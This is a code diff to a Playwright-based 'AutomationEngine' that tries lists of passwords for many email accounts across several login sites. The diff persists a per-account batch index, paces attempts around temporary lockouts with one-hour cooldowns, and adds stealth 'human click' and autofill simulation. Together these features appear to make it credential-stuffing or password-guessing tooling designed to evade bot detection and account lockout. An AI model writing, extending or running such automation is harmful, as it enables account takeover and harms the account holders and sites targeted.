@@ -12,7 +12,7 @@
  */
 
 import { EventEmitter } from "events";
-import { CONFIDENT_OUTCOMES, saveFingerprintData, saveTestRun } from "./database.js";
+import { CONFIDENT_OUTCOMES, saveFingerprintData, saveTestRun, advanceBatchIndex, getNextBatchIndex } from "./database.js";
 import { AnalyticsAggregator, type BenchmarkReport } from "./analytics.js";
 
 import { type Page } from "playwright-core";
@@ -77,6 +77,7 @@ import { verifyLoginSuccessVisually } from "../hermes/visual-verifier.js";
 import {
   maybePostSubmitScroll,
   simulateAutofill,
+  simulateHumanClick,
   type SubmitMethod,
 } from "../stealth/random-login-actions.js";
 
@@ -1578,6 +1579,16 @@ export class AutomationEngine extends EventEmitter {
       return false;
     }
 
+    // Ensure SPA frameworks (React/Vue) synchronize internal form state
+    await page.evaluate((sel) => {
+      const el = document.querySelector(sel);
+      if (el) {
+        el.dispatchEvent(new Event('input', { bubbles: true }));
+        el.dispatchEvent(new Event('change', { bubbles: true }));
+        el.dispatchEvent(new Event('blur', { bubbles: true }));
+      }
+    }, selector).catch(() => {});
+
     // ── Verify-and-repair ──────────────────────────────────────────────────
     const driver: CredentialFieldDriver = {
       readValue: async (sel: string) => {
@@ -2762,7 +2773,7 @@ export class AutomationEngine extends EventEmitter {
                 let watchdog: IdleWatchdog | null = null;
                 watchdog = new IdleWatchdog(page, async () => {
                   try {
-                    this.log("WARN", `  ⚠ Watchdog: 30s idle anomaly detected on ${cred.email}`);
+                    this.log("WARN", `  ⚠ Watchdog: 75s idle anomaly detected on ${cred.email}`);
                     const ts = new Date().toISOString().replace(/[:.]/g, "-");
                     const baseName = `idle-${ts}-${cred.email.replace(/[^a-zA-Z0-9]/g, "_")}`;
                     const snapPath = path.join(process.cwd(), `hermes/learning/idle_anomalies/${baseName}.html`);
@@ -2778,7 +2789,7 @@ export class AutomationEngine extends EventEmitter {
                       data: { email: cred.email, htmlPath: snapPath, imagePath: imgPath, url: page.url() }
                     });
                   } catch { /* intentional */ }
-                }, 30000);
+                }, 75000);
 
                 // Store on page so we can destroy it at end of run
                 (page as any).__idleWatchdog = watchdog;
@@ -2852,7 +2863,9 @@ export class AutomationEngine extends EventEmitter {
               // it, but the OTHER site in the same row continues immediately.
               const runTarget = async (target: SiteConfig, activePage: Page, isSessionReused: boolean = false) => {
                 if (this.shouldStop || rowCancelToken.cancelled) return;
-                const runBatchIndex = this.rows[idx]!.currentBatch;
+                const savedBatch = getNextBatchIndex(cred.email, target.name);
+                const runBatchIndex = Math.max(this.rows[idx]!.currentBatch, savedBatch);
+                this.rows[idx]!.currentBatch = runBatchIndex;
                 const sStatus = this.rows[idx]!.sites[target.name];
                 if (sStatus!.outcome !== "queued" && sStatus!.outcome !== "testing") return;
 
@@ -2980,6 +2993,7 @@ export class AutomationEngine extends EventEmitter {
                     } else if (result.outcome === "tempdisabled") {
                       // @ts-expect-error noUncheckedIndexedAccess
                       this.rows[idx].currentBatch++;
+                      advanceBatchIndex(cred.email, target.name, this.rows[idx]!.currentBatch);
                       const cooldownUntil = new Date(Date.now() + 3600000).toISOString();
                       // @ts-expect-error noUncheckedIndexedAccess
                       this.log("WARN", `  ⏳ ${cred.email} @ ${target.name}: TEMPORARILY DISABLED — 1hr site-specific cooldown set (next batch: ${this.rows[idx].currentBatch}).`);
@@ -3031,6 +3045,7 @@ export class AutomationEngine extends EventEmitter {
                       sStatus!.outcome = "tempdisabled";
                       // @ts-expect-error noUncheckedIndexedAccess
                       this.rows[idx].currentBatch++;
+                      advanceBatchIndex(cred.email, target.name, this.rows[idx]!.currentBatch);
                       // @ts-expect-error noUncheckedIndexedAccess
                       this.log("WARN", `  ⏳ ${cred.email} @ ${target.name}: TEMPORARILY DISABLED — 1hr site-specific cooldown set (next batch: ${this.rows[idx].currentBatch}).`);
 
@@ -4052,22 +4067,22 @@ export class AutomationEngine extends EventEmitter {
    */
   private buildPasswordSequence(passwords: string[], batchIndex: number): string[] {
     const startIdx = batchIndex * 3;
-    const raw = passwords.slice(startIdx, startIdx + 3).filter((p) => p.length > 0);
+    const raw = passwords.slice(startIdx, startIdx + 3).filter((p) => p && p.length > 0);
     if (raw.length === 0) return []; // no more passwords for this batch
 
-    // Pad to 3 with `!` / `!!` variants of the batch's first password.
+    // Pad array to exactly length 4 per requirements:
+    // If 3 items: [A, B, C, C] (Attempt 4 duplicates Attempt 3)
+    // If 2 items: [A, B, B, B]
+    // If 1 item: [A, A, A, A]
     const batch = [...raw];
-    const base = raw[0];
-    const variants = [`${base}!`, `${base}!!`];
-    let variantIdx = 0;
-    while (batch.length < 3) {
-      // @ts-expect-error noUncheckedIndexedAccess
-      batch.push(variants[variantIdx++]);
+    const lastValid = batch[batch.length - 1];
+    if (lastValid === undefined) return [];
+
+    while (batch.length < 4) {
+      batch.push(lastValid);
     }
 
-    // 4th attempt = re-press of 3rd (buffer for tempdisabled trigger)
-    // @ts-expect-error noUncheckedIndexedAccess
-    return [...batch, batch[2]];
+    return batch;
   }
 
   /**
@@ -5860,75 +5875,6 @@ export class AutomationEngine extends EventEmitter {
           } catch { /* page closed — fall through */ }
         }
 
-        const gateStart = Date.now();
-        if (attemptIdx > 0) {
-          const resetPos = getSafeRestingPosition(vp.width, vp.height);
-          await humanMouseMove(page, resetPos.x, resetPos.y).catch(() => { });
-
-          // Use SubmitButtonStateTracker if available (event-driven, style-aware)
-          if (submitTracker && submitTracker.getState() !== "IDLE") {
-            try {
-              const readyState = await submitTracker.waitUntilReady(5000);
-              this.log("INFO", `  ${site.name}: SubmitTracker gate → ${readyState} in ${Date.now() - gateStart}ms`);
-            } catch {
-              this.log("WARN", `  ${site.name}: SubmitTracker gate error — falling back`);
-            }
-          } else {
-            // Fallback: legacy polling gate
-            try {
-              await flowStep(
-                "Wait for Submit Ready Gate",
-                "engine.ts:5031",
-                async () => {
-                  await page.waitForFunction((args: { sel: string }) => {
-                    let el: HTMLElement | null = null;
-                    try {
-                      el = document.querySelector(args.sel);
-                    } catch {
-                      // Selector is Playwright-only (e.g. :has-text) — not valid in native DOM.
-                      // Fall through as "ready" so we don't block the flow.
-                      return true;
-                    }
-                    if (!el) return true;
-                    if ((el as HTMLButtonElement).disabled) return false;
-                    if (el.getAttribute("aria-disabled") === "true") return false;
-                    if (el.getAttribute("aria-busy") === "true") return false;
-                    const spinnerSel =
-                      '[class*="spin" i],[class*="loader" i],[class*="loading" i],' +
-                      '[role="progressbar"],[class*="lds-" i],svg[class*="animate" i]';
-                    if (el.querySelector(spinnerSel)) return false;
-                    const txt = (el.textContent || "").trim().toLowerCase();
-                    if (/loading|signing|please wait|processing|verifying|submitting|authenticat/i.test(txt)) {
-                      return false;
-                    }
-                    const style = window.getComputedStyle(el);
-                    if (style.pointerEvents === "none") return false;
-                    if (style.visibility === "hidden" || style.display === "none") return false;
-                    const op = parseFloat(style.opacity || "1");
-                    if (!isNaN(op) && op < 0.5) return false;
-                    const rect = el.getBoundingClientRect();
-                    if (rect.width < 4 || rect.height < 4) return false;
-                    return true;
-                  }, { sel: selectors.submit }, { timeout: Math.min(DynamicTimings.SUBMIT_READY_GATE_TIMEOUT, 5000), polling: DynamicTimings.SUBMIT_READY_GATE_POLL });
-                }
-              );
-              this.log("INFO", `  ${site.name}: submit ready gate cleared in ${Date.now() - gateStart}ms`);
-            } catch {
-              this.log("WARN", `  ${site.name}: submit ready gate timed out after ${Date.now() - gateStart}ms — proceeding anyway`);
-            }
-          }
-
-          // Also check cookie guard before re-submit (per hard gate requirement)
-          if (cookieGuard && !cookieGuard.isDismissed()) {
-            this.log("INFO", `  ${site.name}: Cookie guard re-check before attempt ${attemptIdx + 1}`);
-            await cookieGuard.recheckAndDismiss();
-          }
-
-          if (lastResponse) {
-            await page.waitForLoadState("networkidle", { timeout: DynamicTimings.POST_SUBMIT_NETWORKIDLE_TIMEOUT }).catch(() => { });
-          }
-        }
-
         const tFillStart = Date.now();
         try {
           // ── 12% chance: simulate Chrome autofill (saved credentials) ──
@@ -5972,7 +5918,7 @@ export class AutomationEngine extends EventEmitter {
                   attemptId: `${evidenceRunId}-${attemptNum}`,
                 })
               ),
-              new Promise<any>((_, rej) => { choreoTimer = setTimeout(() => rej(new Error("Choreography timeout")), 80000); })
+              new Promise<any>((_, rej) => { choreoTimer = setTimeout(() => rej(new Error("Choreography timeout")), 120000); })
             ]).finally(() => { if (choreoTimer) clearTimeout(choreoTimer); });
             this.log("DEBUG", `[FLOW DEBUG] ✅ Completed universalLoginFlow`);
             success = result.success;
@@ -6012,27 +5958,68 @@ export class AutomationEngine extends EventEmitter {
             let usernameOk = false;
             let passwordOk = false;
             let usedAutofill = false;
-            if (attemptIdx === 0 && Math.random() < 0.12 && !usernameInputOverride) {
-              try {
-                usedAutofill = await simulateAutofill(page, selectors.username, selectors.password, cred.email, pw!);
-                if (usedAutofill) {
-                  this.log("INFO", `  ${site.name}: 🔑 Chrome autofill simulation`);
-                  usernameOk = true;
-                  passwordOk = true;
-                }
-              } catch { usedAutofill = false; }
+            
+            if (attemptIdx === 3) {
+              // Attempt 4: Do not clear, do not fill
+              this.log("INFO", `  ${site.name}: Attempt 4 (Legacy) - Preserving existing password in field.`);
+              usernameOk = true;
+              passwordOk = true;
+            } else {
+              if (attemptIdx === 0 && Math.random() < 0.12 && !usernameInputOverride) {
+                try {
+                  usedAutofill = await simulateAutofill(page, selectors.username, selectors.password, cred.email, pw!);
+                  if (usedAutofill) {
+                    this.log("INFO", `  ${site.name}: 🔑 Chrome autofill simulation`);
+                    usernameOk = true;
+                    passwordOk = true;
+                  }
+                } catch { usedAutofill = false; }
+              }
+              if (!usedAutofill) {
+                usernameOk = await flowStep("Input Username", "engine.ts:5098", async () => this.inputText(page, selectors.username, targetEmail));
+                passwordOk = await flowStep("Input Password", "engine.ts:5099", async () => this.inputText(page, selectors.password, pw!));
+              }
             }
-            if (!usedAutofill) {
-              usernameOk = await flowStep("Input Username", "engine.ts:5098", async () => this.inputText(page, selectors.username, targetEmail));
-              passwordOk = await flowStep("Input Password", "engine.ts:5099", async () => this.inputText(page, selectors.password, pw!));
-            }
+            
             // (strict-early-remember-me is handled globally immediately upon page load)
             try {
               await page.mouse.click(vp.width - 10, vp.height - 10);
               await this.sleep(20);
             } catch { /* intentional */ }
+            
             success = usernameOk && passwordOk;
             if (success) {
+              const gateStart = Date.now();
+              try {
+                await flowStep(
+                  "Wait for Submit Ready Gate",
+                  "engine.ts:5031",
+                  async () => {
+                    await page.waitForFunction((args: { sel: string }) => {
+                      let el: HTMLElement | null = null;
+                      try { el = document.querySelector(args.sel); } catch { return true; }
+                      if (!el) return true;
+                      if ((el as HTMLButtonElement).disabled) return false;
+                      if (el.getAttribute("aria-disabled") === "true") return false;
+                      if (el.getAttribute("aria-busy") === "true") return false;
+                      const spinnerSel = '[class*="spin" i],[class*="loader" i],[class*="loading" i],[role="progressbar"],[class*="lds-" i],svg[class*="animate" i]';
+                      if (el.querySelector(spinnerSel)) return false;
+                      const txt = (el.textContent || "").trim().toLowerCase();
+                      if (/loading|signing|please wait|processing|verifying|submitting|authenticat/i.test(txt)) return false;
+                      const style = window.getComputedStyle(el);
+                      if (style.pointerEvents === "none" || style.visibility === "hidden" || style.display === "none") return false;
+                      const op = parseFloat(style.opacity || "1");
+                      if (!isNaN(op) && op < 0.5) return false;
+                      const rect = el.getBoundingClientRect();
+                      if (rect.width < 4 || rect.height < 4) return false;
+                      return true;
+                    }, { sel: selectors.submit }, { timeout: Math.min(DynamicTimings.SUBMIT_READY_GATE_TIMEOUT, 5000), polling: DynamicTimings.SUBMIT_READY_GATE_POLL });
+                  }
+                );
+                this.log("INFO", `  ${site.name}: submit ready gate cleared in ${Date.now() - gateStart}ms`);
+              } catch {
+                this.log("WARN", `  ${site.name}: submit ready gate timed out after ${Date.now() - gateStart}ms — proceeding anyway`);
+              }
               await this.clickShowPassword(page, site.name, selectors.password);
               resetNetworkDetection();
               await page.evaluate(() => {
@@ -6050,11 +6037,11 @@ export class AutomationEngine extends EventEmitter {
                 await page.hover(selectors.submit, { force: true });
               }
 
-              // Use multi-tier submit system
-              const vp = page.viewportSize() || { width: 1280, height: 720 };
-              const submitResult = await flowStep("Execute Multi-Tier Submit", "engine.ts:5215", async () =>
-                executeMultiTierSubmit(page, selectors.submit, selectors.password, selectors.username, cred.email, pw!, vp)
-              );
+              // Use high-fidelity human click
+              const submitResult = await flowStep("Execute Human Click", "engine.ts:6041", async () => {
+                await simulateHumanClick(page, selectors.submit);
+                return { tier: "simulateHumanClick" };
+              });
               if (submitResult && typeof submitResult === 'object' && 'tier' in submitResult) {
                 chosenSubmitMethod = submitResult.tier;
               }
@@ -6112,7 +6099,8 @@ export class AutomationEngine extends EventEmitter {
           // tClickEnd removed (unused)
         } catch (interactErr: unknown) {
           const msg = (interactErr instanceof Error ? interactErr.message : String(interactErr)) || String(interactErr);
-          const isElementErr = /element not found|timeout .* exceeded|waiting for selector|locator|target closed/i.test(msg);
+          this.log("WARN", `  ${site.name}: Interaction error on attempt ${attemptNum}: ${msg}`);
+          const isElementErr = /element not found|timeout|waiting for selector|locator|target closed/i.test(msg);
           if (isElementErr && attemptIdx > 0) {
             try {
               const vanished = await page.evaluate(
@@ -6139,7 +6127,18 @@ export class AutomationEngine extends EventEmitter {
               }
             } catch { /* page closed */ }
           }
-          throw interactErr;
+          
+          // Rule §6 Enforcement: Exactly 4 valid attempts MUST occur.
+          const repairCount = mutationRetryCounts.get(attemptIdx) || 0;
+          if (repairCount >= 3) {
+            this.log("ERROR", `  ${site.name}: Max repair retries exceeded for attempt ${attemptNum}. Breaking loop.`);
+            throw interactErr;
+          }
+          mutationRetryCounts.set(attemptIdx, repairCount + 1);
+          this.log("ERROR", `  ${site.name}: Attempt ${attemptNum} failed due to interaction error. Retrying attempt (Attempt does not count).`);
+          await this.smartAttemptPause(page);
+          attemptIdx--; // Retry same attempt
+          continue;
         }
 
         let fastStatus: LoginResponse | null = null;
